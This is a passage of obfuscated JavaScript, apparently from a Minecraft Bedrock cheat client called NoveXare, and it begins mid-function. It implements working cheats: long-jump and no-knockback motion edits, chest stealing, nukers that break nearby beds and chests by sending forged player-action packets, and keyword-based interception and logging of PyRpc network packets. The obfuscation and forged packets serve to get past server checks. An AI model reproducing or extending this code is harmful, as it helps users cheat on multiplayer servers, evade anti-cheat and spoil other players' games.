    sendChatMessage("我正在跳跃");
  }
  if (pvp_dalao) {
    setTitle("还是什么都不知道的小白");
  }
  if (longjump) {
    const _0x551af1 = getEntityMotion(_0x2c6696);
    const _0x3a7ae7 = getEntityPos(_0x2c6696);
    const _0x3f2cfa = getEntityRot(_0x2c6696);
    const _0x3c4dd3 = predictEntityPos(_0x551af1, _0x3a7ae7, 20);
    var _0x30c9b5 = {
      yaw: _0x3f2cfa.yaw,
      pitch: 0
    };
    const _0x19d44b = getDisplacement(longjump_x / 4, _0x3a7ae7, _0x30c9b5);
    setMotion(_0x19d44b.x - _0x3a7ae7.x, longjump_y * 10, _0x19d44b.z - _0x3a7ae7.z);
  }
  if (better_jump) {
    const _0x2cc6e4 = getEntityMotion(_0x2c6696);
    const _0x837012 = getEntityPos(_0x2c6696);
    const _0x519522 = getEntityRot(_0x2c6696);
    const _0x514772 = predictEntityPos(_0x2cc6e4, _0x837012, getSpeed(self_id));
    const _0x1b29cf = getPlayerAngle(_0x514772, _0x2c6696, "yaw_pos");
    var _0x11dc29 = {
      yaw: _0x1b29cf,
      pitch: 0
    };
    const _0x1a7895 = getDisplacement(0.7, _0x837012, _0x11dc29);
    setMotion(_0x1a7895.x - _0x837012.x, 0.42, _0x1a7895.z - _0x837012.z);
  }
};
function onPyRpcReceiveEvent(_0x4ba81c, _0x186408) {
  const _0x226b51 = hexToString(_0x186408).toLowerCase();
  if (packet_manager && packet_receive) {
    let _0x1b8564 = false;
    let _0x79dca7 = false;
    const _0x263150 = (_0x2833e7, _0xf83fb9) => {
      if (_0x2833e7.length == 0) {
        return _0xf83fb9;
      }
      return _0x2833e7.some(_0x70c4dd => _0x226b51.includes(_0x70c4dd) === _0xf83fb9);
    };
    for (let _0x14d384 of keyword) {
      if (_0x1b8564) {
        break;
      }
      if (_0x226b51.includes(_0x14d384)) {
        _0x1b8564 = true;
      }
    }
    for (let _0x714a50 of receive_keyword) {
      if (_0x1b8564) {
        break;
      }
      if (_0x226b51.includes(_0x714a50)) {
        _0x1b8564 = true;
      }
    }
    for (let _0x21bee4 of keyword2) {
      if (!_0x1b8564) {
        break;
      }
      if (_0x226b51.includes(_0x21bee4)) {
        _0x1b8564 = false;
      }
    }
    for (let _0x288aac of receive_keyword2) {
      if (!_0x1b8564) {
        break;
      }
      if (_0x226b51.includes(_0x288aac)) {
        _0x1b8564 = false;
      }
    }
    for (let _0x4cdcb7 of tip_keyword) {
      if (_0x79dca7) {
        break;
      }
      if (_0x226b51.includes(_0x4cdcb7)) {
        _0x79dca7 = true;
      }
    }
    if (packet_record && packet_manager && (_0x79dca7 && neglect_exclude || !_0x79dca7)) {
      const _0x324c30 = getResource() + "/NoveXare/PyRpc_Record.json";
      const _0x4aae16 = JSON.parse(readFile(_0x324c30));
      var _0x325a7e = {
        packet_hex: _0x186408
      };
      _0x325a7e.packet_format = HexToFormat(_0x186408);
      _0x325a7e.packet_str = hexToString(_0x186408);
      _0x325a7e.time = Date.now();
      _0x325a7e.id = _0x4ba81c;
      _0x325a7e.type = "Receive";
      _0x325a7e.keyword = receive_keyword;
      _0x325a7e.global_keyword = keyword;
      _0x325a7e.intercept = _0x1b8564;
      _0x4aae16[_0x4aae16.length] = _0x325a7e;
      write_file(_0x324c30, JSON.stringify(_0x4aae16, null, 4));
    }
    let _0x25aac8 = "Null";
    if (func_mode.pyrpc_mode === 0) {
      _0x25aac8 = hexToString(_0x186408);
    }
    if (func_mode.pyrpc_mode === 1) {
      _0x25aac8 = _0x186408;
    }
    if (func_mode.pyrpc_mode === 2) {
      _0x25aac8 = HexToFormat(_0x186408);
    }
    const _0x397111 = JSON.parse(readFile(getResource() + "/NoveXare/PyRpc_Config.json"));
    for (let _0xae755a of _0x397111) {
      if (typeof _0xae755a === "object") {
        if (_0xae755a.match_mode === 0 && _0x25aac8.includes(_0xae755a.packet) || _0xae755a.match_mode === 1 && _0x25aac8 === _0xae755a.packet) {
          _0x25aac8 = _0xae755a.remarks;
        }
      }
    }
    const _0x3c6ca2 = _0x1b8564 ? `
§3§l已拦截该PyRpc数据包
§r§e==============================
` : `
§r§e==============================
`;
    if (packet_tip && packet_manager && !_0x79dca7 && (show_no_intercept && !_0x1b8564 || show_intercept && _0x1b8564)) {
      clientMessage("§3§l[NoveXare] §r§7>>> §rPyRpc - §cReceive §7>>>§r\n" + (show_pyrpc_id ? "ID: " + _0x4ba81c + "\n" : "") + _0x25aac8 + _0x3c6ca2);
    }
    return _0x1b8564;
  }
}
function onPyRpcSendEvent(_0x382ac6, _0x35b734) {
  const _0x65eb97 = hexToString(_0x35b734).toLowerCase();
  if (packet_manager && packet_send) {
    var _0x24f832 = false;
    var _0x10b909 = false;
    const _0x53712f = (_0x50c3df, _0x783946) => {
      if (_0x50c3df.length == 0) {
        return _0x783946;
      }
      return _0x50c3df.some(_0x527b35 => _0x65eb97.includes(_0x527b35) === _0x783946);
    };
    for (let _0x41c06f of keyword) {
      if (_0x24f832) {
        break;
      }
      if (_0x65eb97.includes(_0x41c06f)) {
        _0x24f832 = true;
      }
    }
    for (let _0x163a1b of send_keyword) {
      if (_0x24f832) {
        break;
      }
      if (_0x65eb97.includes(_0x163a1b)) {
        _0x24f832 = true;
      }
    }
    for (let _0x27b62a of keyword2) {
      if (!_0x24f832) {
        break;
      }
      if (_0x65eb97.includes(_0x27b62a)) {
        _0x24f832 = false;
      }
    }
    for (let _0x5da80c of send_keyword2) {
      if (!_0x24f832) {
        break;
      }
      if (_0x65eb97.includes(_0x5da80c)) {
        _0x24f832 = false;
      }
    }
    for (let _0x132f1b of tip_keyword) {
      if (_0x10b909) {
        break;
      }
      if (_0x65eb97.includes(_0x132f1b)) {
        _0x10b909 = true;
      }
    }
    var _0x3b8efc = {
      id: _0x382ac6,
      data: _0x35b734
    };
    if (!_0x10b909) {
      last_PyRpc = _0x3b8efc;
    }
    if (packet_record && packet_manager && (_0x10b909 && neglect_exclude || !_0x10b909)) {
      const _0x51af7b = getResource() + "/NoveXare/PyRpc_Record.json";
      const _0xbc8b2 = JSON.parse(readFile(_0x51af7b));
      var _0x27957b = {
        packet_hex: _0x35b734
      };
      _0x27957b.packet_format = HexToFormat(_0x35b734);
      _0x27957b.packet_str = hexToString(_0x35b734);
      _0x27957b.time = Date.now();
      _0x27957b.id = _0x382ac6;
      _0x27957b.type = "Send";
      _0x27957b.keyword = send_keyword;
      _0x27957b.global_keyword = keyword;
      _0x27957b.intercept = _0x24f832 ? true : false;
      _0xbc8b2[_0xbc8b2.length] = _0x27957b;
      write_file(_0x51af7b, JSON.stringify(_0xbc8b2, null, 4));
    }
    let _0x38b231 = "Null";
    if (func_mode.pyrpc_mode === 0) {
      _0x38b231 = hexToString(_0x35b734);
    }
    if (func_mode.pyrpc_mode === 1) {
      _0x38b231 = _0x35b734;
    }
    if (func_mode.pyrpc_mode === 2) {
      _0x38b231 = HexToFormat(_0x35b734);
    }
    const _0x118b77 = JSON.parse(readFile(getResource() + "/NoveXare/PyRpc_Config.json"));
    for (let _0x2675f0 of _0x118b77) {
      if (typeof _0x2675f0 == "object") {
        if (_0x2675f0.match_mode == 0 && _0x38b231.includes(_0x2675f0.packet)) {
          _0x38b231 = remarks;
        }
        if (_0x2675f0.match_mode == 1 && _0x38b231.includes == _0x2675f0.packet) {
          _0x38b231 = remarks;
        }
      } else {
        continue;
      }
    }
    let _0x1f1215 = _0x24f832 ? `
§3§l已拦截该PyRpc数据包
§r§e==============================` : "\n§r§e==============================";
    if (packet_tip && packet_manager && !_0x10b909 && (show_no_intercept && !_0x24f832 || show_intercept && _0x24f832)) {
      clientMessage("§3§l[NoveXare]§r§7 >>> §rPyRpc - §aSend§7 >>> §r \n" + (show_pyrpc_id ? "ID: " + _0x382ac6 + "\n" : "") + _0x38b231 + _0x1f1215);
    }
    return _0x24f832;
  }
}
globalThis.onEntityBehaviorEvent = function (_0x1d052c, _0x5c4d85, _0x111af0) {
  if (_0x5c4d85 == 2 && _0x1d052c == self_id) {
    if (show_activity) {
      sendChatMessage("我正在被攻击");
    }
    if (show_hurt) {
      clientMessage("§3§l[NoveXare]§r§7 >>> §cWarning §7>>> §r您正在受伤 受伤类型:" + _0x111af0);
    }
    if (no_kb) {
      const _0x44c24b = getEntityMotion(self_id);
      const _0x55635e = no_kb_resistance_h / 100;
      const _0x9f148e = no_kb_resistance_v / 100;
      setMotion(_0x44c24b.x - _0x55635e * _0x44c24b.x, _0x44c24b.y - _0x9f148e * _0x44c24b.y, _0x44c24b.z - _0x55635e * _0x44c24b.z);
    }
  }
};
globalThis.onPlayerDestroyBlockEvent = function (_0x1c31bc, _0x23dbbf, _0x587994, _0x5f414c, _0x14fa0f) {
  const _0x5678db = getEntityCarriedItem(_0x1c31bc);
  const _0x39a5eb = getEntityPos(_0x1c31bc);
  const _0x2ef4d0 = getBlock(_0x23dbbf, _0x587994, _0x5f414c);
  if (_0x2ef4d0.namespace != "minecraft:air") {
    if (show_destroy_block) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + string_format(`命名空间:{}, §rID:{}, §r特殊值:{}
手持:{}-[{}], ID:{}, 特殊值:{}
坐标:[{}, {}, {}]`, _0x2ef4d0.namespace, _0x2ef4d0.id, _0x2ef4d0.aux, _0x5678db.name, _0x5678db.namespace, _0x5678db.id, _0x5678db.aux, _0x23dbbf, _0x587994, _0x5f414c));
    }
    if (show_activity) {
      sendChatMessage("我正在破坏" + _0x23dbbf + " " + _0x587994 + " " + _0x5f414c + "的" + _0x2ef4d0.namespace);
    }
    if (auto_mine && (_0x2ef4d0.namespace == destroy_namespace || !isDestroy)) {
      if (!isDestroy && current_mine_num < mine_num) {
        isDestroy = true;
        destroy_namespace = _0x2ef4d0.namespace;
      }
      if (isDestroy && destroy_namespace != _0x2ef4d0.namespace && current_mine_num < mine_num && destroy_list.length > 0) {
        destroy_namespace = _0x2ef4d0.namespace;
      }
      var _0x414a5f = {
        x: _0x23dbbf,
        y: _0x587994,
        z: _0x5f414c
      };
      if (getDistance(_0x39a5eb, _0x414a5f) <= mine_distance && isDestroy) {
        let _0x3a4b46 = [[_0x23dbbf + 1, _0x587994, _0x5f414c], [_0x23dbbf - 1, _0x587994, _0x5f414c], [_0x23dbbf, _0x587994, _0x5f414c + 1], [_0x23dbbf, _0x587994, _0x5f414c - 1], [_0x23dbbf, _0x587994 + 1, _0x5f414c], [_0x23dbbf, _0x587994 - 1, _0x5f414c]];
        for (p of _0x3a4b46) {
          const _0x27d5a6 = getBlock(p[0], p[1], p[2]);
          if (_0x27d5a6.namespace != "minecraft:air" && _0x2ef4d0.namespace == destroy_namespace) {
            destroy_list.push(p);
          }
        }
      }
    }
  }
};
function onReady() {
  if (killaura_auto_close && killaura) {
    killaura = false;
    if (show_tip) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r§c Auto Disable KillAura!");
    }
  }
  if (show_game_info) {
    const _0x2494a6 = getWorldData();
    if (show_game_info) {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + string_format("进入世界 {} ，难度:{} 游戏模式:{} 游戏时间:{} 随机刻速度:{}", _0x2494a6.levelName, _0x2494a6.difficulty, _0x2494a6.gameType, _0x2494a6.time, _0x2494a6.randomTickSpeed));
    }
  }
}
globalThis.onPlayerBuildBlockEvent = function (_0x3534b0, _0x2ab6a0, _0x422353, _0x4df436, _0x32e301) {
  if (pvp_dalao) {
    setTitle("又或是建筑大佬");
  }
  const _0x1ea8cd = getEntityCarriedItem(_0x3534b0);
  const _0x362112 = getBlock(_0x2ab6a0, _0x422353, _0x4df436);
  if (show_activity) {
    sendChatMessage("我正在放置" + _0x1ea8cd.name);
  }
  if (show_click_block) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " " + string_format(`命名空间:{}, §rID:{}, §r特殊值:{}
手持:{}-[{}], ID:{}, 特殊值:{}
坐标:[{}, {}, {}]`, _0x362112.namespace, _0x362112.id, _0x362112.aux, _0x1ea8cd.name, _0x1ea8cd.namespace, _0x1ea8cd.id, _0x1ea8cd.aux, _0x2ab6a0, _0x422353, _0x4df436));
  }
  if (click_tp) {
    MenuTP(_0x2ab6a0, _0x422353 + 1, _0x4df436);
  }
  if (open_shop && resList.includes(_0x1ea8cd.namespace)) {
    const _0x4dc3d7 = getEntityList();
    for (id of _0x4dc3d7) {
      if (getEntityTypeId(id) === 16777999 || getEntityTypeId(id) === 16778099) {
        attack(id, attack_action);
        break;
      }
    }
  }
  if (FakeBuilder) {
    let _0x10700f = [[_0x2ab6a0, _0x422353 - 1, _0x4df436], [_0x2ab6a0, _0x422353 + 1, _0x4df436], [_0x2ab6a0, _0x422353, _0x4df436 - 1], [_0x2ab6a0, _0x422353, _0x4df436 + 1], [_0x2ab6a0 - 1, _0x422353, _0x4df436], [_0x2ab6a0 + 1, _0x422353, _0x4df436]];
    setBlock(_0x10700f[_0x32e301][0], _0x10700f[_0x32e301][1], _0x10700f[_0x32e301][2], _0x1ea8cd.namespace.replace("minecraft:", ""), _0x1ea8cd.aux);
    return true;
  }
  if (ClickBlock) {
    setBlock(_0x2ab6a0, _0x422353, _0x4df436, _0x1ea8cd.namespace.replace("minecraft:", ""), _0x1ea8cd.aux);
    return true;
  }
  if (chest_steal && _0x362112.namespace == "minecraft:chest") {
    isOpenChest = true;
    setTimeout(() => callModule(47, "{\"auto_close\":true,\"value\":true}"), steal_delay * 1000);
    setTimeout(() => {
      callModule(47, "{\"auto_close\":false,\"value\":false}");
      isOpenChest = false;
    }, (steal_delay + 0.05) * 1000);
  }
  if (click_destroy) {
    const _0x56b8b9 = getPlayerBlockPos(self_id);
    for (let _0x3480b6 = Math.ceil(-destroy_size / 2); _0x3480b6 < Math.floor(destroy_size / 2 + 1); _0x3480b6++) {
      for (let _0x51986b = Math.ceil(-destroy_size / 2); _0x51986b < Math.floor(destroy_size / 2 + 1); _0x51986b++) {
        for (let _0x5ca006 = Math.ceil(-destroy_size / 2); _0x5ca006 < Math.floor(destroy_size / 2 + 1); _0x5ca006++) {
          if (excludeFeet && _0x422353 + _0x51986b <= _0x56b8b9.y - 1) {
            continue;
          }
          if (replace_block) {
            setBlock(_0x2ab6a0 + _0x3480b6, _0x422353 + _0x51986b, _0x4df436 + _0x5ca006, "air", 0);
          }
          if (!replace_block) {
            destroyBlock(self_id, _0x2ab6a0 + _0x3480b6, _0x422353 + _0x51986b, _0x4df436 + _0x5ca006, 0);
          }
          if (destroy_packet) {
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x56b8b9.x + _0x3480b6,
                y: _0x56b8b9.y + _0x51986b,
                z: _0x56b8b9.z + _0x5ca006
              },
              value: 1,
              type: 0
            });
            var _0x133fbb = {
              x: _0x56b8b9.x + _0x3480b6,
              y: _0x56b8b9.y + _0x51986b,
              z: _0x56b8b9.z + _0x5ca006
            };
            var _0x129d5a = {
              id: self_id,
              pos: _0x133fbb,
              value: 1,
              type: 26
            };
            sendPlayerAction(_0x129d5a);
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x56b8b9.x + _0x3480b6,
                y: _0x56b8b9.y + _0x51986b,
                z: _0x56b8b9.z + _0x5ca006
              },
              value: 1,
              type: 18
            });
            sendPlayerAction({
              id: self_id,
              pos: {
                x: _0x56b8b9.x + _0x3480b6,
                y: _0x56b8b9.y + _0x51986b,
                z: _0x56b8b9.z + _0x5ca006
              },
              value: 1,
              type: 2
            });
          }
        }
      }
    }
  }
  if (auto_bed && _0x362112.namespace == "minecraft:bed" && !isBedbuild) {
    if (_0x1ea8cd.namespace == "minecraft:air") {
      clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §7>>>§r 请手持方块");
    }
    let _0x1a6838 = [[_0x2ab6a0 + 1, _0x422353, _0x4df436], [_0x2ab6a0 - 1, _0x422353, _0x4df436], [_0x2ab6a0, _0x422353, _0x4df436 + 1], [_0x2ab6a0, _0x422353, _0x4df436 - 1], [_0x2ab6a0, _0x422353 + 1, _0x4df436]];
    isBedbuild = true;
    for (let _0x3ea0e1 of _0x1a6838) {
      const _0x57c56f = getBlock(_0x3ea0e1[0], _0x3ea0e1[1], _0x3ea0e1[2]);
      if (_0x57c56f.namespace == "minecraft:air") {
        HYTBuild(_0x3ea0e1[0], _0x3ea0e1[1], _0x3ea0e1[2]);
      }
    }
    isBedbuild = false;
  }
  if (blockin && !isBlockin) {
    if (temp_pos.x == _0x2ab6a0 && temp_pos.y == _0x422353 && temp_pos.z == _0x4df436) {
      isBlockin = true;
      let _0x37637e = getPlayerBlockPos(self_id);
      let _0x41b6fe = [[_0x37637e.x, _0x37637e.y - 1, _0x37637e.z], [_0x37637e.x, _0x37637e.y + 2, _0x37637e.z], [_0x37637e.x + 1, _0x37637e.y, _0x37637e.z], [_0x37637e.x - 1, _0x37637e.y, _0x37637e.z], [_0x37637e.x, _0x37637e.y, _0x37637e.z + 1], [_0x37637e.x, _0x37637e.y, _0x37637e.z - 1], [_0x37637e.x + 1, _0x37637e.y + 1, _0x37637e.z], [_0x37637e.x - 1, _0x37637e.y + 1, _0x37637e.z], [_0x37637e.x, _0x37637e.y + 1, _0x37637e.z + 1], [_0x37637e.x, _0x37637e.y + 1, _0x37637e.z - 1]];
      for (pos of _0x41b6fe) {
        let _0x28a570 = getBlock(pos[0], pos[1], pos[2]);
        if (_0x28a570.namespace == "minecraft:air") {
          buildBlock(self_id, pos[0], pos[1], pos[2], 0);
        }
      }
      temp_pos = {
        x: 0,
        y: 0,
        z: 0
      };
      isBlockin = false;
      return true;
    }
    if (temp_pos.x != _0x2ab6a0 || temp_pos.y != _0x422353 || temp_pos.z != _0x4df436) {
      temp_pos = {
        x: _0x2ab6a0,
        y: _0x422353,
        z: _0x4df436
      };
    }
  }
  if (breaker && (_0x1ea8cd.namespace.includes("sword") || _0x1ea8cd.namespace.includes("pickaxe"))) {
    for (let _0x102866 = -5; _0x102866 <= 5; _0x102866++) {
      for (let _0x1982c7 = -5; _0x1982c7 < 5; _0x1982c7++) {
        for (let _0x58b234 = -5; _0x58b234 <= 5; _0x58b234++) {
          let _0x270fac = _0x2ab6a0 + _0x102866;
          let _0x8727bb = _0x422353 + _0x1982c7;
          let _0x5829fc = _0x4df436 + _0x58b234;
          let _0x4acff4 = getBlock(_0x270fac, _0x8727bb, _0x5829fc);
          if (break_bed && _0x4acff4.namespace == "minecraft:bed" || break_chest && _0x4acff4.namespace == "minecraft:chest") {
            let _0x395568 = getBlock(_0x270fac, _0x8727bb + 1, _0x5829fc);
            if (_0x395568.namespace != "minecraft:air" && destroy_up) {
              _0x8727bb += 1;
            }
            destroyBlock(self_id, _0x270fac, _0x8727bb, _0x5829fc, 0);
            var _0x25b837 = {
              x: _0x270fac,
              y: _0x8727bb,
              z: _0x5829fc
            };
            var _0x318c88 = {
              id: self_id,
              pos: _0x25b837,
              value: 1,
              type: 0
            };
            sendPlayerAction(_0x318c88);
            var _0x17850f = {
              x: _0x270fac,
              y: _0x8727bb,
              z: _0x5829fc
            };
            var _0x35618e = {
              id: self_id,
              pos: _0x17850f,
              value: 1,
              type: 26
            };
            sendPlayerAction(_0x35618e);
            var _0x200284 = {
              x: _0x270fac,
              y: _0x8727bb,
              z: _0x5829fc
            };
            var _0x189cce = {
              id: self_id,
              pos: _0x200284,
              value: 1,
              type: 18
            };
            sendPlayerAction(_0x189cce);
            var _0x98daf2 = {
              x: _0x270fac,
              y: _0x8727bb,
              z: _0x5829fc
            };
            var _0x1c480 = {
              id: self_id,
              pos: _0x98daf2,
              value: 1,
              type: 2
            };
            sendPlayerAction(_0x1c480);
            break;
          }
        }
      }
    }
  }
  if (block_ac_select && block_ac) {
    var _0x19af54 = {
      x: _0x2ab6a0,
      y: _0x422353,
      z: _0x4df436
    };
    ac_pos.push(_0x19af54);
    clientMessage("§3§l[NoveXare]§r§7 >>> §rTip §7>>> §r" + string_format("已添加[{}, {}, {}]", _0x2ab6a0, _0x422353, _0x4df436));
    return true;
  }
  if (get_bed_pos && _0x362112.namespace == "minecraft:bed") {
    bed_list = [];
    var _0x2e750c = {
      x: _0x2ab6a0,
      y: _0x422353,
      z: _0x4df436
    };
    var _0x3680c8 = {
      team: "队伍 - A §e(自己)§r",
      pos: _0x2e750c
    };
    bed_list[0] = _0x3680c8;
    var _0x447f3f = {
      x: -_0x2ab6a0,
      y: _0x422353,
      z: -_0x4df436
    };
    var _0x237070 = {
      team: "队伍 - B",
      pos: _0x447f3f
    };
    bed_list[1] = _0x237070;
    var _0x4bf5ad = {
      x: _0x4df436,
      y: _0x422353,
      z: _0x2ab6a0
    };
    var _0xc9f327 = {
      team: "队伍 - C",
      pos: _0x4bf5ad
    };
    bed_list[2] = _0xc9f327;
    var _0x2738d4 = {
      x: -_0x4df436,
      y: _0x422353,
      z: -_0x2ab6a0
    };
    var _0x3fa2b3 = {
      team: "队伍 - D",
      pos: _0x2738d4
    };
    bed_list[3] = _0x3fa2b3;
    clientMessage("§3§l[NoveXare] §r§7>>>§r BedList §7>>>§r " + JSON.stringify(bed_list, null, 2));
  }
  if (fast_build && build_list.length === 0 && build_success) {
    const _0x368940 = getEntityRot(self_id);
    for (let _0x193fa5 = 0; _0x193fa5 < build_distance + 1; _0x193fa5++) {
      if (_0x368940.yaw >= -45 && _0x368940.yaw < 45) {
        var _0x15e549 = {
          x: _0x2ab6a0,
          y: _0x422353,
          z: _0x4df436 + _0x193fa5
        };
        build_list.push(_0x15e549);
      }
      if (_0x368940.yaw >= 45 && _0x368940.yaw < 135) {
        var _0x3afccb = {
          x: _0x2ab6a0 - _0x193fa5,
          y: _0x422353,
          z: _0x4df436
        };
        build_list.push(_0x3afccb);
      }
      if (_0x368940.yaw >= 135 || _0x368940.yaw < -135) {
        var _0x561b30 = {
          x: _0x2ab6a0,
          y: _0x422353,
          z: _0x4df436 - _0x193fa5
        };
        build_list.push(_0x561b30);
      }
      if (_0x368940.yaw >= -135 && _0x368940.yaw < -45) {
        var _0x493129 = {
          x: _0x2ab6a0 + _0x193fa5,
          y: _0x422353,
          z: _0x4df436
        };
        build_list.push(_0x493129);
      }
    }
    build_success = false;
    return true;
  }
  if (anti_touch && (_0x362112.namespace == "minecraft:chest" || _0x362112.namespace == "minecraft:ender_chest")) {
    return true;
  }
};
function onKeyboardDownEvent(_0x5cb603) {
  if (show_key_down) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 按下键值 " + _0x5cb603);
  }
  if (key_bind_list.length > 0 && key_bind_list[_0x5cb603] != undefined) {
    callFunc(key_bind_list[_0x5cb603], !globalThis[key_bind_list[_0x5cb603]]);
  }
  if (isBinding != null) {
    key_bind_list[_0x5cb603] = isBinding;
    NoveXare_Config.key_binds = key_bind_list;
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 绑定 " + isBinding + " 与键值 " + _0x5cb603);
    isBinding = null;
  }
}
function onKeyboardUpEvent(_0x4519e3) {
  if (show_key_up) {
    clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>>" + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + " 释放键值 " + _0x4519e3);
  }
}
const default_config = readFile(config_path + "/" + getData("default_config", "null") + ".json");
if (default_config != "{}") {
  let list = JSON.parse(default_config);
  let num = 0;
  for (let key in list) {
    num++;
    if (key.includes("_mode")) {
      func_mode[key] = list[key];
      continue;
    }
    if (key != "cmd" && key != "binds") {
      globalThis[key] = list[key];
    }
  }
  bind_func = list.binds;
  if (list.cmd.length > 0) {
    list.cmd.map(_0x50380b => PluginCMD(_0x50380b));
  }
  clientMessage("§3§l[NoveXare] §r§7>>>§r Tip §r §7>>> " + (rgb_tip ? "§" + rgb_color[rgb_l] : "§r") + "自动加载配置成功，共" + num + "条配置");
}
clientMessage("§3§l[NoveXare] §r§7>>>§r §aNoveXare 加载成功!");
clientMessage("§3§l[NoveXare] §r§7>>>§r UI §7>>>§r 您当前使用的UI是: " + current_ui.name);
